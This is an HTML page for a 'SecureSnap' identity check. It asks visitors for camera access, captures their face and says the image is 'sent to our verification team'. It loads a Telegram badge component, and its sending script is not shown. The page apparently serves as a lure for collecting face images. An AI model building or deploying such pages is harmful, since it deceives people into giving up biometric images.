<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureSnap Verification</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
    <script src="https://unpkg.com/feather-icons"></script>
</head>
<body class="bg-gray-900 text-gray-100 min-h-screen flex items-center justify-center p-4">
    <div class="w-full max-w-md bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-2xl border border-gray-700 p-8 shadow-xl">
        <!-- Intro Step -->
        <div id="intro-step">
            <div class="inline-flex items-center px-4 py-2 rounded-full bg-blue-900 bg-opacity-30 text-blue-300 border border-blue-800 mb-6">
                <i data-feather="shield" class="w-4 h-4 mr-2"></i>
                <span class="text-sm font-medium">Secure Verification</span>
            </div>
            <h2 class="text-2xl font-bold mb-3">Verify Your Identity</h2>
            <p class="text-gray-400 mb-6">To ensure security, we need to verify your identity. Please allow camera access. Your image will be securely sent to our verification team.</p>
            <button onclick="startVerification()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-4 rounded-lg transition duration-200 flex items-center justify-center">
                <i data-feather="camera" class="w-5 h-5 mr-2"></i>
                Start Verification
            </button>
        </div>

        <!-- Camera Step -->
        <div id="camera-step" class="hidden">
            <h3 id="instruction-text" class="text-lg font-medium mb-6 text-center">Initializing camera...</h3>
            
            <div class="relative w-64 h-64 mx-auto mb-6 rounded-full overflow-hidden border-4 border-gray-700 hidden" id="camera-wrapper">
                <div class="absolute inset-0 border-4 border-white border-opacity-30 rounded-full pointer-events-none"></div>
                <video id="video" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
            </div>

            <div id="progress-bar" class="h-1 bg-blue-500 transition-all duration-1000 ease-linear mx-auto max-w-xs"></div>
        </div>

        <!-- Result Step -->
        <div id="result-step" class="hidden text-center">
            <div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-900 bg-opacity-30 text-green-400 mb-4">
                <i data-feather="check" class="w-8 h-8"></i>
            </div>
            <h2 class="text-2xl font-bold text-green-400 mb-2">Verification Complete</h2>
            <p class="text-gray-400 mb-4">Image captured and sent successfully</p>
            <telegram-badge></telegram-badge>
<img id="captured-result" src="" alt="Captured Face" class="mx-auto rounded-lg border-2 border-green-500 max-w-xs hidden">
            <button onclick="location.reload()" class="mt-6 w-full bg-gray-700 hover:bg-gray-600 text-white font-medium py-3 px-4 rounded-lg transition duration-200">
                <i data-feather="refresh-cw" class="w-5 h-5 mr-2"></i>
                Verify Again
            </button>
        </div>

        <canvas id="canvas" class="hidden"></canvas>
    </div>
    <script src="components/telegram-badge.js"></script>
    <script src="script.js"></script>
<script>
        feather.replace();
    </script>
</body>
</html>
